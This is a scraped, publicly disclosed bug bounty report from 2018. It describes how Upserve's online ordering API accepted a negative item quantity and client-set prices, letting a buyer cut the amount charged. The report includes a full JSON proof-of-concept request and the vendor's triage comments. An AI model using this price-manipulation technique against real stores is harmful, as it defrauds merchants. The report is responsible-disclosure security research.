---
title: "OLO Total price manipulation using negative quantities"
author: fuzz (Matt Thompson)
url: https://hackerone.com/reports/364843
date_published: 2018-06-11
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/364843
bounty: not stated (hidden on page; rewarded 2018-06-22)
vuln_class: business-logic
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #364843. Reported to Upserve. Status: Resolved. Severity: Critical (9 ~ 10). Weakness: Business Logic Errors. CVE: None. Disclosed July 6, 2019. Bounty/Total reward: Hidden.

**Summary by Upserve:** The total amount of an order could be modified by including an item with a negative quantity.

## Timeline

**fuzz** submitted a report to Upserve. June 11, 2018, 10:02pm UTC

Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.

In the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).

The total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.

Request body (JSON, PoC from report; test identifiers retained, card_uuid kept as in report):

```
{"card_uuid":"09ef096d-18d7-4cb4-83b7-5bd15d310aac","city":"Cambridge","email":"mthompson@hexwave.com","first_name":"Matt","last_name":"Thompson","line1":"1230 Massachusetts Ave","order":{"charges":{"items":[{"item_id":"254baa85-92c1-412e-a391-aaf44508d882","name":"ChickenBurger","price":1200,"quantity":2,"instructions":"","total":1200,"modifiers":[],"sides":[]},{"item_id":"9169bfc1-2ee1-455b-ad65-aeadd36f46eb","name":"BreadPudding","price":900,"quantity":-1,"instructions":"","total":900,"modifiers":[],"sides":[]}],"taxes":290,"tip":{"amount":0},"total":1870},"confirmation_code":"upserve-hacker-cafe-32870","fulfillment_info":{"customer":{"email":"mthompson@hexwave.com","first_name":"Matt","last_name":"Thompson","phone":"555-555-5555"},"delivery_info":{"address":{"address_line1":"1230 Massachusetts Ave","address_line2":null,"city":"Cambridge","country":"","state":"MA","zip_code":"02138"}},"instructions":"","type":"delivery"},"id":"a168f311-f0bf-416c-b813-b277e3a7b5b3","payments":{"payments":[{"amount":0,"payment_type":"CREDIT","tip_amount":0}],"total":3190},"time_placed":"2018-06-11T20:48:51.313Z"},"order_total":3190,"phone_number":"555-555-5555","state":"MA","store_pretty_url":"upserve-lounge-test-providence-2","submission_id":"a168f311-f0bf-416c-b813-b277e3a7b5b3","text_alerts":false,"zip":"02138"}
```

## Impact

The attacker can reduce the price of the order.

Attachments: 2 screenshots (F307763, F307764). [signed S3 URLs omitted/REDACTED]

---

**fuzz** posted a comment. June 11, 2018, 10:05pm UTC
Added an attachment containing the PoC code in Python (order.py, F307765).

**upserve-bryan** posted a comment. June 12, 2018, 12:58pm UTC
Hey @fuzz I saw the order come in on this, so this certainly appears valid, but I'll double check the PoC just to make sure we can repro it. Also, I don't know if you kept good records, but I saw you submit another order `upserve-hacker-cafe-27072` where the item price came in a $0.01 but the payment was $13.20. If you know how to repro that, that could be a second bug.

**upserve-bryan** changed the status to **Triaged**. June 12, 2018, 1:14pm UTC

**upserve-bryan** posted a comment. June 12, 2018, 1:28pm UTC
PoC validated @fuzz. There is also a second bug exposed by your PoC where the system will accept an order without the delivery fee element as long as it is factored into the total. This results in an out of balance check. That's a much lower impact bug, but we'll factor it into the reward here.

**fuzz** posted a comment. June 12, 2018, 4:31pm UTC
Hi @upserve-bryan, the item price of $0.01 is due to manipulating the price key in the items array. I can also also set other values such as taxes to 0. The total has to be calculated correctly though, including fees and taxes otherwise the API returns an error.

I just submitted `upserve-hacker-cafe-999999` which should demonstrate this again.

I can see the response JSON from the consumer_info endpoint that your database is storing the modified price, but I'm not sure what kind of impact that would have on your systems (possibly your analytics platforms, if those values are taken into consideration).

The script that sends the modified item price, as well as a screenshot of the order history object are attached.

Cheers,
Matt

Attachments: order2.py (F308078), screenshot (F308079). [signed URLs REDACTED]

**upserve-bryan** posted a comment. June 12, 2018, 4:54pm UTC
Thanks @fuzz. The order comes in out of balance, so the restaurant has to resolve that before they can close the check. There definitely could be some impact there depending on how the restaurant decides to proceed. It all traces back to the same root cause which is how we're validating the order total. Good find.

**Upserve** rewarded fuzz with a bounty. June 22, 2018, 2:41pm UTC

**upserve-bryan** closed the report and changed the status to **Resolved**. July 25, 2018, 2:47pm UTC

**upserve-bryan** requested to disclose this report. June 6, 2019, 5:58pm UTC

This report has been disclosed. July 6, 2019, 5:59pm UTC
